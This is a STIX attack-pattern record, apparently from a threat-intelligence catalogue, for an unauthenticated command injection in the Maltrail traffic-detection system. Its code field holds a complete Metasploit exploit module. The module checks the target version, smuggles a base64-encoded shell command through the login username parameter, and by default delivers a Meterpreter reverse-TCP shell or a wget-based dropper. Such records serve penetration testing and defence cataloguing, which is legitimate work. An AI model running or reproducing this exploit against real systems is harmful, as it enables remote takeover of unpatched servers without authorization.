{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--abd27353-a87c-46f5-ad51-3d42bd81b5b6",
    "created": "2024-08-14T17:14:54.302416Z",
    "modified": "2024-08-14T17:14:54.302419Z",
    "name": "Maltrail Unauthenticated Command Injection",
    "description": " Maltrail is a malicious traffic detection system, utilizing publicly available blacklists containing malicious and/or generally suspicious trails. The Maltrail versions < 0.54 is suffering from a command injection vulnerability. The `subprocess.check_output` function in `mailtrail/core/http.py` contains a command injection vulnerability in the `params.get(\"username\")` parameter. An attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication.  Successfully tested against Maltrail versions 0.52 and 0.53.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/maltrail_rce.rb",
            "external_id": "maltrail_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/stamparm/maltrail/issues/19146"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Maltrail Unauthenticated Command Injection',\n        'Description' => %q{\n          Maltrail is a malicious traffic detection system, utilizing publicly\n          available blacklists containing malicious and/or generally suspicious trails.\n          The Maltrail versions < 0.54 is suffering from a command injection vulnerability.\n          The `subprocess.check_output` function in `mailtrail/core/http.py` contains\n          a command injection vulnerability in the `params.get(\"username\")` parameter.\n          An attacker can exploit this vulnerability by injecting arbitrary OS commands\n          into the username parameter. The injected commands will be executed with the\n          privileges of the running process. This vulnerability can be exploited remotely\n          without authentication.\n\n          Successfully tested against Maltrail versions 0.52 and 0.53.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ege BALCI <egebalci[at]pm.me>', # msf module\n          'Chris Wild', # original PoC, analysis\n        ],\n        'References' => [\n          ['EDB', '51676'],\n          ['URL', 'https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/'],\n          ['URL', 'https://github.com/stamparm/maltrail/issues/19146']\n        ],\n        'Platform' => ['unix', 'linux'],\n        'Privileged' => false,\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => :wget,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DisclosureDate' => '2023-07-31',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(8338),\n        OptString.new('TARGETURI', [ true, 'The URI of the Maltrail server', '/'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'GET'\n    )\n    return CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n    return CheckCode::Unknown(\"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") unless res.code == 200\n\n    version = Rex::Version.new(Regexp.last_match(1)) if res.body =~ %r{\\(v<b>([0-9.]+)</b>\\)}\n\n    if version < Rex::Version.new('0.54')\n      return CheckCode::Appears(\"Version Detected: #{version}\")\n    end\n\n    CheckCode::Safe(\"Version Detected: #{version}\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    send_request_raw( # This needs to be a raw requess cuz we don't wanna URL encode the body\n      'uri' => normalize_uri(target_uri.path, 'login'),\n      'method' => 'POST',\n      'headers' => {\n        'ctype' => 'application/x-www-form-urlencoded'\n      },\n      'data' => \"username=;`echo+\\\"#{Rex::Text.encode_base64(cmd)}\\\"+|+base64+-d+|+sh;#`\" # We also need all the +\n    )\n  end\n\n  def exploit\n    case target['Type']\n    when :unix_cmd\n      print_status(\"Executing #{target.name}...\")\n      execute_command(payload.encoded)\n    when :linux_dropper\n      print_status(\"Executing #{target.name}...\")\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-07-31",
    "x_mitre_platforms": [
        "linux'"
    ]
}